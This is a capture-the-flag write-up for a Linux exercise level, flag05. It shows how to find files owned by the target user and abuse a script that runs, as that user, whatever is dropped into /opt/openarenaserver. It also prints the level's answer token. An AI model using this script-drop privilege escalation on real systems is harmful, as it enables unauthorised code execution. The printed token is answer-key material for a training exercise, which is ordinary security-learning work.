Upon arrival, we get nothing.
Let's find if we have access to any files owned by flag05 : `find / -uid 3005 -gid 3005` (you can find flag05's uid and gid in the /etc/passwd file with `cat`).
We can access : /usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

We can read /usr/sbin/openarenaserver :
"#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done"

This script will execute any script in the /opt/openarenaserver, then delete it.
We'll try to exploit it in order to get the flag, like so :

script.sh :
"#/bin/sh

echo "$(getflag)" > /tmp/openarena_flag
"

You can directly write this script in the folder, or do it like so :
`echo 'echo "$(getflag)" > /tmp/openarena_flag' > /opt/openarenaserver/script.sh`

We just have to wait for the openarenaserver script to launch our script, then retrieve the content from the `getflag` command in /tmp/openarena_flag.
`cat /tmp/openarena_flag` => Check flag.Here is your token : viuaaale9huek52boumoomioc
